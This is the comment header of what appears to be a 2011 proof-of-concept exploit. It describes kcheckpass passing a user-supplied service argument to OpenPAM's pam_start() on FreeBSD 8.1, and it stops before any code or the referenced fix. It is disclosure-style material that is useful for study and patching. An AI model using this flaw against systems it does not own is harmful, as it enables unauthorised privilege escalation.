# kcheckpass invoking pam_start() with user provided
# service argument, what a bad idea. OpenPAM accepts that.
# Maybe this pam_start() vulnerability is exploitable via
# other vectors as well.
# Vuln tested on a FreeBSD 8.1. It does not affect
# Linux PAM, as it is checking for / character

# (C) 2011 by some dude, meant as a PoC! Only use on your own
# machine and on your own risk!!!

# This commit is likely to fix the bug:
